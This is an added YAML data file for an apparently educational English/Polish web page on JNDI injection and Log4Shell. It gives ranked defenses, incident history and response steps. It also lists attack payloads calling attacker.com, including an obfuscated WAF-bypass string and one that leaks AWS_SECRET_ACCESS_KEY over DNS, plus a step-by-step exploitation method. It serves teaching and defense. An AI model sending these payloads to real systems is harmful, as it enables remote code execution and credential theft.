@@ -1,0 +1,460 @@
+meta:
+  id: jndi
+  threatId: cat_1_research10
+  severity: Critical
+  color: '#8b5cf6'
+  colorRgb: 139,92,246
+  cwe: CWE-917
+  cvss: '10.0'
+  standard: OWASP A03:2021
+hero:
+  titleMain: 'JNDI '
+  titleGrad: Injection
+  titleTail: ' (Log4Shell)'
+  topbar: JNDI Injection (Log4Shell)
+  lead:
+    en: 'JNDI is designed to fetch and instantiate remote Java objects — a lookup like ldap://attacker.com/Exploit isn''t malformed syntax to escape, it''s a well-formed request to a feature working exactly as built. Log4Shell weaponized this at internet scale: Log4j 2''s message-lookup substitution meant merely logging an attacker string like ${jndi:ldap://attacker.com/a} — a User-Agent header, a chat message — triggered a remote class fetch and code execution. CVE-2021-44228 scored a perfect CVSS 10.0 and CISA issued Emergency Directive 22-02, one of the few ever issued for a single library flaw.'
+    pl: 'JNDI zostało zaprojektowane, by pobierać i tworzyć instancje zdalnych obiektów Java — lookup taki jak ldap://attacker.com/Exploit to nie zniekształcona składnia do ominięcia, to poprawnie sformułowane żądanie do funkcji działającej dokładnie tak jak zaprojektowano. Log4Shell uzbroiło to w skali internetu: podstawianie lookupów w wiadomościach Log4j 2 oznaczało, że samo zalogowanie stringa atakującego jak ${jndi:ldap://attacker.com/a} — nagłówek User-Agent, wiadomość na czacie — wyzwalało pobranie zdalnej klasy i wykonanie kodu. CVE-2021-44228 uzyskało idealne CVSS 10.0, a CISA wydała Emergency Directive 22-02, jedną z niewielu kiedykolwiek wydanych dla pojedynczej luki w bibliotece.'
+  metrics:
+  - k: CWE-917
+    v:
+      en: Weakness ID
+      pl: ID słabości
+  - k: '10.0'
+    v: CVSS · Critical
+  - k: A03:2021
+    v: OWASP Top 10
+  - k: '7'
+    v:
+      en: Attack variants
+      pl: Warianty ataku
+  sources:
+  - label: OWASP A03:2021
+    url: https://owasp.org/Top10/A03_2021-Injection/
+  - label: CWE-917 (MITRE)
+    url: https://cwe.mitre.org/data/definitions/917.html
+  - label: CISA Emergency Directive 22-02
+    url: https://www.cisa.gov/news-events/directives/ed-22-02-mitigate-apache-log4j-vulnerability
+  - label: NVD — CVE-2021-44228
+    url: https://nvd.nist.gov/vuln/detail/CVE-2021-44228
+sectionOrder:
+- overview
+- types
+- code
+- langrisks
+- method
+- defense
+- incidents
+- tools
+- compliance
+- ir
+- sources
+nav:
+- id: overview
+  en: Overview
+  pl: Przegląd
+- id: types
+  en: Attack types
+  pl: Typy ataków
+- id: code
+  en: Vuln vs Secure
+  pl: Podatny vs Bezpieczny
+- id: langrisks
+  en: Hardening layers
+  pl: Warstwy wzmocnienia
+- id: method
+  en: Methodology
+  pl: Metodyka
+- id: defense
+  en: Defense layers
+  pl: Warstwy obrony
+- id: incidents
+  en: Real incidents
+  pl: Incydenty
+- id: tools
+  en: SAST / DAST
+  pl: SAST / DAST
+- id: compliance
+  en: Compliance
+  pl: Zgodność
+- id: ir
+  en: Incident response
+  pl: Reagowanie
+- id: sources
+  en: Sources
+  pl: Źródła
+sections:
+  attacks:
+    title:
+      en: Attack types
+      pl: Typy ataków
+    lead:
+      en: Seven ways the same remote-object-fetch capability is turned into RCE — from the original Log4Shell payload to the local-gadget bypass that defeated JDK hardening.
+      pl: Siedem sposobów, w jakie ta sama zdolność pobierania zdalnych obiektów zamienia się w RCE — od oryginalnego ładunku Log4Shell po obejście gadżetem lokalnym, które pokonało wzmocnienie JDK.
+    items:
+    - name: Log4Shell Message-Lookup RCE (LDAP)
+      sev: critical
+      description:
+        en: Any attacker string logged by vulnerable Log4j 2 (2.0-beta9 to 2.14.1) is substituted — ${jndi:ldap://...} triggers a JNDI lookup with no explicit lookup() call anywhere in the app.
+        pl: Każdy string atakującego zalogowany przez podatne Log4j 2 (2.0-beta9 do 2.14.1) jest podstawiany — ${jndi:ldap://...} wyzwala lookup JNDI bez żadnego jawnego wywołania lookup() w aplikacji.
+      payload: ${jndi:ldap://attacker.com/a}  (e.g. in a User-Agent header)
+    - name: LDAP Reference Remote-Codebase Loading
+      sev: critical
+      description:
+        en: A malicious LDAP entry carries javaFactory/javaCodeBase attributes; the victim JVM downloads and instantiates the referenced remote class, running its static initializer.
+        pl: Złośliwy wpis LDAP niesie atrybuty javaFactory/javaCodeBase; JVM ofiary pobiera i tworzy instancję zdalnej klasy, uruchamiając jej inicjalizator statyczny.
+      payload: 'LDAP entry: objectClass=javaNamingReference; javaCodeBase=http://attacker.com/; javaFactory=Exploit'
+    - name: RMI-Based JNDI Injection
+      sev: critical
+      description:
+        en: A lookup pointed at a hostile RMI registry returns a Reference or serialized object, historically with a wider trust window than LDAP.
+        pl: Lookup skierowany na wrogi rejestr RMI zwraca Reference lub zserializowany obiekt, historycznie z szerszym oknem zaufania niż LDAP.
+      payload: ${jndi:rmi://attacker.com:1099/Exploit}
+    - name: Alternative Naming Providers (DNS Exfiltration / CORBA-IIOP)
+      sev: high
+      description:
+        en: dns:// lookups give no RCE but are the classic out-of-band detection/exfiltration channel; iiop:// (CORBA) can, like RMI/LDAP, return references leading to RCE (cf. WebLogic CVE-2020-2551).
+        pl: Lookupy dns:// nie dają RCE, ale są klasycznym kanałem detekcji/eksfiltracji out-of-band; iiop:// (CORBA) może, jak RMI/LDAP, zwracać referencje prowadzące do RCE (por. WebLogic CVE-2020-2551).
+      payload: ${jndi:ldap://${env:AWS_SECRET_ACCESS_KEY}.attacker.com/a}
+    - name: Hardening Bypass via Local Gadgets / Deserialization
+      sev: high
+      description:
+        en: Even with trustURLCodebase=false blocking remote class loading, a malicious server returns a serialized object exploiting a deserialization gadget already on the victim's classpath — no remote download needed.
+        pl: Nawet gdy trustURLCodebase=false blokuje ładowanie zdalnych klas, złośliwy serwer zwraca zserializowany obiekt wykorzystujący gadżet deserializacji już obecny w classpath ofiary — bez potrzeby pobierania zdalnego.
+      payload: LDAP entry returns javaSerializedData triggering a Commons-Collections gadget chain
+    - name: Obfuscated / Nested Lookups (WAF Bypass)
+      sev: critical
+      description:
+        en: Log4j lookup syntax nests and self-substitutes, letting attackers reassemble "jndi" from fragments to defeat naive string-matching filters.
+        pl: Składnia lookupów Log4j zagnieżdża się i podstawia samą siebie, pozwalając atakującym złożyć "jndi" z fragmentów, by pokonać naiwne filtry dopasowujące stringi.
+      payload: ${${::-j}${::-n}${::-d}${::-i}:ldap://attacker.com/a}
+    - name: JDBC Appender Config Injection
+      sev: medium
+      description:
+        en: 'A distinct follow-on (CVE-2021-44832): an attacker who can modify Log4j configuration points a JDBC Appender''s DataSource at a malicious JNDI URI. Requires config write access, not remotely triggerable via logged strings alone.'
+        pl: 'Odrębna kontynuacja (CVE-2021-44832): atakujący z możliwością modyfikacji konfiguracji Log4j kieruje DataSource JDBC Appendera na złośliwy URI JNDI. Wymaga dostępu do zapisu konfiguracji, nie jest zdalnie wyzwalane samym zalogowanym stringiem.'
+      payload: <DataSource jndiName="ldap://attacker.com/Exploit"/>  in log4j2.xml
+  code:
+    title:
+      en: Vulnerable vs Secure
+      pl: Podatny vs Bezpieczny
+    lead:
+      en: The definitive fix is upgrading Log4j — everything else (allow-listing direct lookups, disabling remote codebase loading) is a mitigation layer, not a substitute.
+      pl: Ostateczną naprawą jest aktualizacja Log4j — wszystko inne (allowlista bezpośrednich lookupów, wyłączenie ładowania zdalnego kodu) to warstwa łagodząca, nie substytut.
+    languages:
+    - label: Direct InitialContext.lookup()
+      lang: java
+      vulnerable: '// VULNERABLE
+
+        String name = request.getParameter("resource");   // attacker-controlled
+
+        Object obj = new InitialContext().lookup(name);    // ldap://attacker.com/Exploit -> RCE'
+      safe: "// SECURE — allow-list logical names, never let scheme/host be user-controlled\nprivate static final Set<String> ALLOWED = Set.of(\"jdbc/AppDB\", \"jdbc/ReportDB\");\nString name = request.getParameter(\"resource\");\nif (!ALLOWED.contains(name)) {\n    throw new SecurityException(\"Disallowed JNDI name\");\n}\nObject obj = new InitialContext().lookup(name);"
+    - label: Log4j message substitution
+      lang: java
+      vulnerable: '// VULNERABLE — Log4j < 2.15, any logged string is a sink
+
+        Logger log = LogManager.getLogger();
+
+        String ua = request.getHeader("User-Agent");  // "${jndi:ldap://attacker.com/a}"
+
+        log.info("Request from UA: {}", ua);          // Log4j expands ${jndi:...} -> RCE'
+      safe: '// SECURE — upgrade to Log4j 2.17.1+ (definitive fix)
+
+        // Interim mitigation (2.10-2.14.1 only), incomplete for CVE-2021-45046:
+
+        //   -Dlog4j2.formatMsgNoLookups=true
+
+        // Works on any version: physically remove the sink class
+
+        //   zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class
+
+        log.info("Request from UA: {}", ua);          // now inert after upgrade/mitigation'
+    - label: JVM-wide hardening
+      lang: java
+      vulnerable: '// VULNERABLE default on pre-2018 JDKs
+
+        // com.sun.jndi.ldap.object.trustURLCodebase=true (implicit)'
+      safe: '// SECURE — block remote codebase loading JVM-wide
+
+        // -Dcom.sun.jndi.ldap.object.trustURLCodebase=false
+
+        // -Dcom.sun.jndi.rmi.object.trustURLCodebase=false
+
+        // -Dcom.sun.jndi.cosnaming.object.trustURLCodebase=false
+
+        // Default since JDK 6u211 / 7u201 / 8u191 / 11.0.1 (CVE-2018-3149) —
+
+        // still enforce explicitly; does NOT stop local-gadget/deserialization bypass.'
+  langRisks:
+    title:
+      en: Hardening layers and their limits
+      pl: Warstwy wzmocnienia i ich granice
+    lead:
+      en: Each hardening layer closes one door — none is complete alone, which is exactly why Log4Shell needed four separate CVE fixes to fully close.
+      pl: Każda warstwa wzmocnienia zamyka jedne drzwi — żadna nie jest kompletna sama w sobie, dlatego właśnie Log4Shell wymagało czterech osobnych napraw CVE, by w pełni się zamknąć.
+    rows:
+    - fw: Log4j 2.10-2.14.1
+      api: log4j2.formatMsgNoLookups=true
+      note:
+        en: Interim Log4Shell mitigation for CVE-2021-44228 — but explicitly incomplete for CVE-2021-45046 in non-default Pattern Layout + Context Lookup (MDC) configurations.
+        pl: Tymczasowe złagodzenie Log4Shell dla CVE-2021-44228 — ale wyraźnie niepełne dla CVE-2021-45046 w niedomyślnych konfiguracjach Pattern Layout + Context Lookup (MDC).
+    - fw: Log4j 2.16.0
+      api: JNDI disabled by default
+      note:
+        en: Removed message-pattern lookups entirely and disabled JNDI by default — closes CVE-2021-45046, but the recursive-lookup DoS (CVE-2021-45105) still needed 2.17.0.
+        pl: Całkowicie usunięto lookupy wzorców wiadomości i domyślnie wyłączono JNDI — zamyka CVE-2021-45046, ale DoS rekursywnego lookupu (CVE-2021-45105) wciąż wymagał 2.17.0.
+    - fw: JDK 6u211/7u201/8u191/11.0.1
+      api: trustURLCodebase=false (CVE-2018-3149)
+      note:
+        en: Default since ~2018-2019, blocks remote-codebase class loading — but local-classpath gadget chains and Tomcat BeanFactory-style bypasses still achieve RCE without it.
+        pl: Domyślne od ~2018-2019, blokuje ładowanie klas ze zdalnego codebase — ale łańcuchy gadżetów lokalnego classpath i obejścia w stylu Tomcat BeanFactory wciąż osiągają RCE bez tego.
+    - fw: Log4j 2.17.1
+      api: Definitive fix (all 4 CVEs closed)
+      note:
+        en: Restricts JNDI to allow-listed protocols/hosts via log4j2.enableJndi*/allowedJndiProtocols, and closes the JDBC Appender config-injection vector (CVE-2021-44832). This is the version to actually target.
+        pl: Ogranicza JNDI do dozwolonych protokołów/hostów przez log4j2.enableJndi*/allowedJndiProtocols, i zamyka wektor wstrzyknięcia konfiguracji JDBC Appender (CVE-2021-44832). To wersja, do której faktycznie należy dążyć.
+  method:
+    title:
+      en: Attack methodology
+      pl: Metodyka ataku
+    lead:
+      en: How an attacker progresses from a blind probe against any Java app to full RCE.
+      pl: Jak atakujący przechodzi od ślepej sondy przeciw dowolnej aplikacji Java do pełnego RCE.
+    steps:
+    - title:
+        en: Find loggable input
+        pl: Znajdź logowalne wejście
+      description:
+        en: 'Enumerate every field the app might log: HTTP headers (User-Agent, X-Forwarded-For), form fields, usernames, chat messages, filenames — any user string is a candidate sink.'
+        pl: 'Wylicz każde pole, które aplikacja mogłaby zalogować: nagłówki HTTP (User-Agent, X-Forwarded-For), pola formularzy, nazwy użytkowników, wiadomości czatu, nazwy plików — każdy string użytkownika to kandydat na sink.'
+    - title:
+        en: Blind probe with an OOB callback
+        pl: Ślepa sonda z callbackiem OOB
+      description:
+        en: Inject ${jndi:ldap://<uid>.attacker-domain/a} into each candidate field. A DNS/LDAP hit on the callback (Burp Collaborator, interactsh) confirms the field is logged by a vulnerable Log4j.
+        pl: Wstrzyknij ${jndi:ldap://<uid>.domena-atakującego/a} w każde pole-kandydata. Trafienie DNS/LDAP w callback (Burp Collaborator, interactsh) potwierdza że pole jest logowane przez podatne Log4j.
+    - title:
+        en: Bypass filters if blocked
+        pl: Obejście filtrów jeśli blokowane
+      description:
+        en: Retry with obfuscated payloads (${${lower:j}ndi:...}, ${${::-j}ndi...}) to defeat naive string-matching WAFs.
+        pl: Spróbuj ponownie ze zaciemnionymi ładunkami (${${lower:j}ndi:...}, ${${::-j}ndi...}), by pokonać naiwne WAF-y dopasowujące stringi.
+    - title:
+        en: Stand up a malicious JNDI server
+        pl: Postaw złośliwy serwer JNDI
+      description:
+        en: Run marshalsec's LDAPRefServer or the JNDI-Exploit-Kit/rogue-jndi to host an LDAP/RMI endpoint serving a reference to a malicious class, or a serialized gadget for hardened JDKs.
+        pl: Uruchom LDAPRefServer z marshalsec albo JNDI-Exploit-Kit/rogue-jndi, by postawić endpoint LDAP/RMI serwujący referencję do złośliwej klasy, albo zserializowany gadżet dla wzmocnionych JDK.
+    - title:
+        en: Deliver the RCE payload
+        pl: Dostarcz ładunek RCE
+      description:
+        en: Point the confirmed input at the attacker's server. When the target resolves it, it fetches/instantiates the malicious class or deserializes the gadget, executing attacker code.
+        pl: Skieruj potwierdzone wejście na serwer atakującego. Gdy cel to rozwiąże, pobiera/tworzy instancję złośliwej klasy albo deserializuje gadżet, wykonując kod atakującego.
+    - title:
+        en: Post-exploitation
+        pl: Post-eksploatacja
+      description:
+        en: Establish persistence, move laterally, or (in mass campaigns) drop coin miners/botnet loaders — as seen within hours of Log4Shell's public disclosure.
+        pl: Ustanów trwałość, przemieszczaj się lateralnie, albo (w masowych kampaniach) podrzuć koparki kryptowalut/loadery botnetów — jak widziano w ciągu godzin od publicznego ujawnienia Log4Shell.
+  defenses:
+    title:
+      en: Defense layers, ranked
+      pl: Warstwy obrony wg skuteczności
+    lead:
+      en: Upgrading is the only complete fix — every other layer closes one specific door while leaving another open, which is exactly why Log4Shell needed four sequential CVE fixes.
+      pl: Aktualizacja to jedyna kompletna naprawa — każda inna warstwa zamyka jedne konkretne drzwi, zostawiając inne otwarte, dlatego właśnie Log4Shell wymagało czterech kolejnych napraw CVE.
+    items:
+    - rank: 1
+      eff: 99
+      kind: primary
+      label:
+        en: Upgrade Log4j to 2.17.1+
+        pl: Aktualizacja Log4j do 2.17.1+
+      note:
+        en: The definitive fix — removes message lookups by default and restricts JNDI to allow-listed protocols/hosts, closing all four CVEs (44228, 45046, 45105, 44832).
+        pl: Ostateczna naprawa — domyślnie usuwa lookupy wiadomości i ogranicza JNDI do dozwolonych protokołów/hostów, zamykając wszystkie cztery CVE (44228, 45046, 45105, 44832).
+    - rank: 2
+      eff: 93
+      kind: strong
+      label:
+        en: Remove JndiLookup.class from the jar
+        pl: Usunięcie JndiLookup.class z jara
+      note:
+        en: Works on any version by eliminating the sink entirely (zip -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class). Manual and must be reapplied after redeploys.
+        pl: Działa na dowolnej wersji, całkowicie eliminując sink (zip -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class). Ręczne i musi być stosowane ponownie po redeployach.
+    - rank: 3
+      eff: 82
+      kind: strong
+      label:
+        en: formatMsgNoLookups=true (interim)
+        pl: formatMsgNoLookups=true (tymczasowe)
+      note:
+        en: Blocks the original CVE-2021-44228, but explicitly incomplete for CVE-2021-45046 in non-default Context Lookup configurations — a stopgap, not a cure.
+        pl: Blokuje oryginalne CVE-2021-44228, ale wyraźnie niepełne dla CVE-2021-45046 w niedomyślnych konfiguracjach Context Lookup — łatka tymczasowa, nie lekarstwo.
+    - rank: 4
+      eff: 65
+      kind: mitigation
+      label:
+        en: trustURLCodebase=false (JVM)
+        pl: trustURLCodebase=false (JVM)
+      note:
+        en: Default since 2018-era JDKs, blocks remote codebase class loading — but does NOT stop deserialization/local-gadget bypasses that need no remote download.
+        pl: Domyślne od JDK z ~2018 roku, blokuje ładowanie klas ze zdalnego codebase — ale NIE zatrzymuje obejść deserializacji/lokalnych gadżetów niewymagających zdalnego pobrania.
+    - rank: 5
+      eff: 65
+      kind: mitigation
+      label:
+        en: Network egress filtering
+        pl: Filtrowanie ruchu wychodzącego
+      note:
+        en: Blocks outbound LDAP/RMI callbacks and breaks the class-fetch step, but DNS-based exfiltration and internally-reachable gadget servers can still work.
+        pl: Blokuje wychodzące callbacki LDAP/RMI i przerywa krok pobierania klasy, ale eksfiltracja przez DNS i wewnętrznie osiągalne serwery gadżetów mogą wciąż działać.
+    - rank: 6
+      eff: 35
+      kind: weak
+      label:
+        en: WAF signature rules
+        pl: Sygnatury WAF
+      note:
+        en: Nested/obfuscated lookups (${${lower:j}ndi:...}) defeated naive filters within hours of Log4Shell's disclosure. Detective, never preventive.
+        pl: Zagnieżdżone/zaciemnione lookupy (${${lower:j}ndi:...}) pokonały naiwne filtry w ciągu godzin od ujawnienia Log4Shell. Detekcyjne, nigdy zapobiegawcze.
+  incidents:
+    title:
+      en: Real-world incidents
+      pl: Rzeczywiste incydenty
+    lead:
+      en: One of the most significant vulnerabilities in recent history — a research class first identified in 2016, weaponized at internet scale five years later.
+      pl: Jedna z najważniejszych podatności ostatnich lat — klasa badawcza zidentyfikowana po raz pierwszy w 2016, uzbrojona w skali internetu pięć lat później.
+    items:
+    - org: Log4Shell (core RCE)
+      year: 2021
+      impact: CVE-2021-44228, CVSS 10.0
+      cost: Hundreds of millions of devices (est.)
+      description:
+        en: 'Unauthenticated RCE via JNDI message lookup in log4j-core 2.0-beta9 through 2.14.1. Disclosed Dec 9-10, 2021, already exploited as a zero-day. Publicly reported affected products included Minecraft: Java Edition (via chat), with iCloud and Steam widely reported via probe callbacks (medium confidence on exact scope). CISA issued Emergency Directive 22-02 — one of the few ever issued for a single library flaw.'
+        pl: 'Nieuwierzytelnione RCE przez lookup JNDI w wiadomości w log4j-core 2.0-beta9 do 2.14.1. Ujawnione 9-10 grudnia 2021, już eksploitowane jako zero-day. Publicznie zgłoszone dotknięte produkty obejmowały Minecraft: Java Edition (przez czat), z iCloud i Steam szeroko zgłaszanymi przez callbacki sond (średnia pewność co do dokładnego zasięgu). CISA wydała Emergency Directive 22-02 — jedną z niewielu kiedykolwiek wydanych dla pojedynczej luki w bibliotece.'
+    - org: Log4Shell (incomplete-fix follow-ons)
+      year: 2021
+      impact: CVE-2021-45046 (rescored 9.0), CVE-2021-45105 (~7.5 DoS), CVE-2021-44832 (6.6)
+      cost: 3 additional patch cycles
+      description:
+        en: 'The 2.15.0 fix was incomplete: CVE-2021-45046 (Context Lookup/MDC vector, initially rated DoS then rescored to RCE), CVE-2021-45105 (recursive-lookup StackOverflow DoS), and CVE-2021-44832 (JDBC Appender config injection, requires config write access). Fully closed only in 2.17.1 — illustrating why interim mitigations are never a substitute for the real fix.'
+        pl: 'Naprawa 2.15.0 była niepełna: CVE-2021-45046 (wektor Context Lookup/MDC, początkowo oceniony jako DoS potem przeklasyfikowany na RCE), CVE-2021-45105 (DoS StackOverflow z rekursywnego lookupu) i CVE-2021-44832 (wstrzyknięcie konfiguracji JDBC Appender, wymaga dostępu zapisu konfiguracji). W pełni zamknięte dopiero w 2.17.1 — ilustrując dlaczego tymczasowe złagodzenia nigdy nie zastępują prawdziwej naprawy.'
+    - org: Black Hat USA 2016 (foundational research)
+      year: 2016
+      impact: '"A Journey From JNDI/LDAP Manipulation to RCE"'
+      cost: 5 years before Log4Shell
+      description:
+        en: Alvaro Munoz and Oleksandr Mirosh's research originally identified and popularized the JNDI-injection-to-RCE class via RMI, LDAP, and CORBA — years before Log4Shell existed. This directly enabled the JDK hardening (trustURLCodebase, CVE-2018-3149) and the exploitation techniques later reused en masse against Log4j.
+        pl: Badania Alvaro Munoza i Oleksandra Mirosha oryginalnie zidentyfikowały i spopularyzowały klasę JNDI-injection-do-RCE przez RMI, LDAP i CORBA — lata przed istnieniem Log4Shell. To bezpośrednio umożliwiło wzmocnienie JDK (trustURLCodebase, CVE-2018-3149) i techniki eksploatacji później masowo reużyte przeciw Log4j.
+    inlineSources:
+    - label: CVE-2021-44228
+      url: https://nvd.nist.gov/vuln/detail/CVE-2021-44228
+    - label: CVE-2021-45046
+      url: https://nvd.nist.gov/vuln/detail/CVE-2021-45046
+    - label: CISA Emergency Directive 22-02
+      url: https://www.cisa.gov/news-events/directives/ed-22-02-mitigate-apache-log4j-vulnerability
+  tools:
+    title:
+      en: Detection tooling
+      pl: Narzędzia wykrywania
+    lead:
+      en: Dependency scanners are the most reliable Log4Shell detector, since most exposure came from a vulnerable library, not custom lookup() calls.
+      pl: Skanery zależności są najbardziej niezawodnym detektorem Log4Shell, bo większość ekspozycji pochodziła z podatnej biblioteki, nie własnych wywołań lookup().
+    sast:
+    - - CodeQL
+      - java/jndi-injection dataflow query, tracing untrusted input into JNDI lookup sinks
+    - - Semgrep
+      - Rules for tainted data reaching InitialContext.lookup() plus vulnerable Log4j version detection
+    - - Checkmarx / Fortify SCA
+      - JNDI injection and unsafe deserialization sink detection
+    - - OWASP Dependency-Check / Snyk / Trivy
+      - SCA identifying vulnerable log4j-core versions in the dependency tree — the practical Log4Shell detector
+    dast:
+    - - log4j-scan
+      - Scanner injecting obfuscated ${jndi:...} payloads across headers/params with OOB callback detection
+    - - marshalsec
+      - Rogue LDAP/RMI referral server (LDAPRefServer) — the standard tool to serve the exploit class during PoCs
+    - - JNDI-Exploit-Kit / rogue-jndi
+      - Turnkey malicious JNDI server serving remote-codebase references or serialized gadgets for hardened JDKs
+    - - Interactsh / Burp Collaborator
+      - Out-of-band interaction servers confirming blind DNS/LDAP callbacks
+    note:
+      en: <strong>Key signal:</strong> an outdated <code>log4j-core</code> in your dependency tree matters more than any code pattern — run an SCA scan first, then grep for direct <code>InitialContext.lookup()</code> calls fed by request data.
+      pl: <strong>Kluczowy sygnał:</strong> nieaktualne <code>log4j-core</code> w drzewie zależności ma większe znaczenie niż jakikolwiek wzorzec kodu — najpierw uruchom skan SCA, potem szukaj bezpośrednich wywołań <code>InitialContext.lookup()</code> zasilanych danymi żądania.
+  compliance:
+    title:
+      en: Compliance quick-reference
+      pl: Szybka zgodność
+    lead:
+      en: NVD's own primary classification for Log4Shell is CWE-917 (Expression Language Injection) — not a dedicated JNDI CWE, which doesn't exist. CWE-502 captures the actual deserialization/remote-object mechanism underneath.
+      pl: Własna, główna klasyfikacja NVD dla Log4Shell to CWE-917 (Expression Language Injection) — nie dedykowane CWE dla JNDI, które nie istnieje. CWE-502 opisuje właściwy mechanizm deserializacji/zdalnego obiektu pod spodem.
+    items:
+    - std: CWE (MITRE/NVD)
+      items:
+      - CWE-917 — primary per NVD for CVE-2021-44228 (Expression Language Injection, reflecting Log4j's ${...} substitution)
+      - CWE-502 — Deserialization of Untrusted Data (the underlying remote-object/gadget mechanism)
+      - CWE-400 — Uncontrolled Resource Consumption (CVE-2021-45105 recursion DoS)
+      - CWE-20 — Improper Input Validation (broader parent, Apache's own classification)
+    - std: OWASP
+      items:
+      - A03:2021 — Injection (most-cited category, the canonical modern injection example)
+      - A06:2021 — Vulnerable and Outdated Components (the pragmatic reality — most exposure was via an unpatched dependency)
+      - A08:2021 — Software and Data Integrity Failures (the deserialization/gadget angle)
+    - std: Government / national security
+      items:
+      - CISA Emergency Directive 22-02 (Dec 17, 2021) — mandated federal remediation
+      - CISA Known Exploited Vulnerabilities (KEV) catalog entry
+      - US Cyber Safety Review Board — first-ever report (July 2022) dedicated to Log4Shell, calling it an "endemic vulnerability"
+    inlineSources:
+    - label: CWE-917 (MITRE)
+      url: https://cwe.mitre.org/data/definitions/917.html
+    - label: CWE-502 (MITRE)
+      url: https://cwe.mitre.org/data/definitions/502.html
+    - label: OWASP A03:2021
+      url: https://owasp.org/Top10/A03_2021-Injection/
+  ir:
+    title:
+      en: Incident response checklist
+      pl: Lista kontrolna reagowania
+    lead:
+      en: If you confirm active JNDI injection / Log4Shell exploitation, work this list top to bottom.
+      pl: Po potwierdzeniu aktywnej eksploatacji JNDI injection / Log4Shell, przejdź tę listę od góry.
+    steps:
+    - en: Identify every asset running a vulnerable log4j-core version via SCA scan (Snyk/Trivy/Dependency-Check) — assume compromise on any that logged untrusted input before patching
+      pl: Zidentyfikuj każdy zasób z podatną wersją log4j-core przez skan SCA (Snyk/Trivy/Dependency-Check) — zakładaj kompromitację na każdym, który logował niezaufane wejście przed załataniem
+    - en: Check outbound connection logs for unexpected LDAP/RMI/DNS traffic to unknown hosts around the suspected exploitation window
+      pl: Sprawdź logi połączeń wychodzących pod kątem nieoczekiwanego ruchu LDAP/RMI/DNS do nieznanych hostów w podejrzanym oknie eksploatacji
+    - en: If RCE is confirmed, treat the host as fully compromised — rotate all credentials/secrets reachable from that process
+      pl: Jeśli RCE jest potwierdzone, traktuj hosta jako w pełni skompromitowanego — zrotuj wszystkie poświadczenia/sekrety osiągalne z tego procesu
+    - en: Upgrade Log4j to 2.17.1+ immediately; do not rely on formatMsgNoLookups or trustURLCodebase alone as the fix
+      pl: Natychmiast zaktualizuj Log4j do 2.17.1+; nie polegaj wyłącznie na formatMsgNoLookups czy trustURLCodebase jako naprawie
+    - en: Hunt for persistence — cron jobs, webshells, unexpected scheduled tasks, and coin-miner processes
+      pl: Poluj na trwałość — zadania cron, webshelle, nieoczekiwane zaplanowane zadania i procesy koparek kryptowalut
+    - en: Sweep every application and third-party vendor product for the same vulnerable dependency, not just the initially-found instance
+      pl: Przeskanuj każdą aplikację i produkt dostawcy trzeciego pod kątem tej samej podatnej zależności, nie tylko początkowo znalezionej instancji
+    - en: Notify per CISA KEV / applicable compliance obligations if operating in regulated or federal environments
+      pl: Powiadom zgodnie z CISA KEV / obowiązującymi wymogami zgodności jeśli działasz w środowisku regulowanym lub federalnym
+  sources:
+    title:
+      en: Sources
+      pl: Źródła
+    items:
+    - label: OWASP A03:2021 Injection
+      url: https://owasp.org/Top10/A03_2021-Injection/
+    - label: CWE-917 (MITRE)
+      url: https://cwe.mitre.org/data/definitions/917.html
+    - label: CWE-502 (MITRE)
+      url: https://cwe.mitre.org/data/definitions/502.html
+    - label: CISA Emergency Directive 22-02
+      url: https://www.cisa.gov/news-events/directives/ed-22-02-mitigate-apache-log4j-vulnerability
+    - label: NVD — CVE-2021-44228
+      url: https://nvd.nist.gov/vuln/detail/CVE-2021-44228
+    - label: NVD — CVE-2021-45046
+      url: https://nvd.nist.gov/vuln/detail/CVE-2021-45046
+    - label: NVD — CVE-2021-45105
+      url: https://nvd.nist.gov/vuln/detail/CVE-2021-45105
+    - label: NVD — CVE-2021-44832
+      url: https://nvd.nist.gov/vuln/detail/CVE-2021-44832
